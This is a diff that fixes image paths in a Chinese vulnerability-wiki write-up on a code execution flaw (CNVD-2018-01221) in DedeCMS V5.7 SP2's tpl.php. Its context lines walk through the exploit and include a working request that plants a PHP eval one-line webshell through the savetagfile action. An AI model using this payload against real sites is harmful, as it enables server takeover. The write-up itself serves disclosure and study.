@@ -17,7 +17,7 @@ SP2版本中tpl.php存在代码执行漏洞，攻击者可利用该漏洞在增�
 
 根据公开的漏洞知道tpl.php里面251-281行存在代码执行漏洞，打开tpl.php文件
 
-![](/Users/aresx/Documents/VulWiki/.resource/(CNVD-2018-01221)DedeCMSV5.7SP2存在代码执行漏洞/media/rId24.png)
+![](./.resource/(CNVD-2018-01221)DedeCMSV5.7SP2存在代码执行漏洞/media/rId24.png)
 
 ### 代码分析
 
@@ -39,11 +39,11 @@ SP2版本中tpl.php存在代码执行漏洞，攻击者可利用该漏洞在增�
 
     http://0-sec.org/dede/tpl.php?action=upload
 
-![](/Users/aresx/Documents/VulWiki/.resource/(CNVD-2018-01221)DedeCMSV5.7SP2存在代码执行漏洞/media/rId27.png)
+![](./.resource/(CNVD-2018-01221)DedeCMSV5.7SP2存在代码执行漏洞/media/rId27.png)
 
 然后查看网页源代码，找到token
 
-![](/Users/aresx/Documents/VulWiki/.resource/(CNVD-2018-01221)DedeCMSV5.7SP2存在代码执行漏洞/media/rId28.png)
+![](./.resource/(CNVD-2018-01221)DedeCMSV5.7SP2存在代码执行漏洞/media/rId28.png)
 
 构造payload如下
 
@@ -51,16 +51,16 @@ SP2版本中tpl.php存在代码执行漏洞，攻击者可利用该漏洞在增�
 
 访问了成功写入
 
-![](/Users/aresx/Documents/VulWiki/.resource/(CNVD-2018-01221)DedeCMSV5.7SP2存在代码执行漏洞/media/rId29.png)
+![](./.resource/(CNVD-2018-01221)DedeCMSV5.7SP2存在代码执行漏洞/media/rId29.png)
 
 访问写入的文件
 
     http://0-sec.org/include/taglib/（你上传的文件名）.lib.php
 
-![](/Users/aresx/Documents/VulWiki/.resource/(CNVD-2018-01221)DedeCMSV5.7SP2存在代码执行漏洞/media/rId30.png)
+![](./.resource/(CNVD-2018-01221)DedeCMSV5.7SP2存在代码执行漏洞/media/rId30.png)
 
 也可以构造一句话木马payload
 
     http://0-sec.org/dede5.7/dede/tpl.php?filename=caidao.lib.php&action=savetagfile&content=%3C?php%20@eval($_POST[%27dylan%27])?%3E&token=2d7ef87e9828edaad2d7b6bbe37f1929
 
-![](/Users/aresx/Documents/VulWiki/.resource/(CNVD-2018-01221)DedeCMSV5.7SP2存在代码执行漏洞/media/rId31.png)
+![](./.resource/(CNVD-2018-01221)DedeCMSV5.7SP2存在代码执行漏洞/media/rId31.png)
